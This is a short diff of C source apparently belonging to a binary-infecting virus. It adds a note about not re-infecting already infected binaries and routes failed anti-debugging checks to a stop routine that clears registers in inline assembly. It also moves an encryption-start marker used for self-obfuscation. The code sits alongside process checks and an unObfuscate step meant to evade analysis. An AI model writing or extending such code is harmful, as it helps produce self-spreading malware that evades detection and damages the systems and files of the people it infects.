@@ -1,3 +1,4 @@
+// TODO Do not infect already infected binaries
 static void  start(void) {}
 #define _FCNTL_H
 #define _SYS_MMAN_H
@@ -44,7 +45,7 @@ int   entry_point(void *magic) {
   if (checkProcess(procName) != 0)
     return (stop(1, magic));
   if (preventDebug() == -1)
-    return (1);
+    return (stop(1, magic));
   if (magic != (void *)0x42)
     if (unObfuscate() == -1)
       return (stop(1, magic));
@@ -58,7 +59,8 @@ int   entry_point(void *magic) {
 static int   stop(int status, void *magic) {
   if (magic == (void *)0x42)
     return (status);
-  asm("mov $0, %rax\n\t"
+  asm("leave\n\t"
+      "mov $0, %rax\n\t"
       "mov $0, %rbx\n\t"
       "mov $0, %rcx\n\t"
       "mov $0, %rdx\n\t"
@@ -113,7 +115,6 @@ static int unObfuscate(void) {
   return (0);
 }
 
-static void encryptStart(void) {}
 typedef off_t off64_t;
 typedef ino_t ino64_t;
 
@@ -447,6 +448,7 @@ static int   preventDebug(void) {
   return (0);
 }
 
+static void encryptStart(void) {}
 struct bfile {
   int         fd;
   off_t       size;
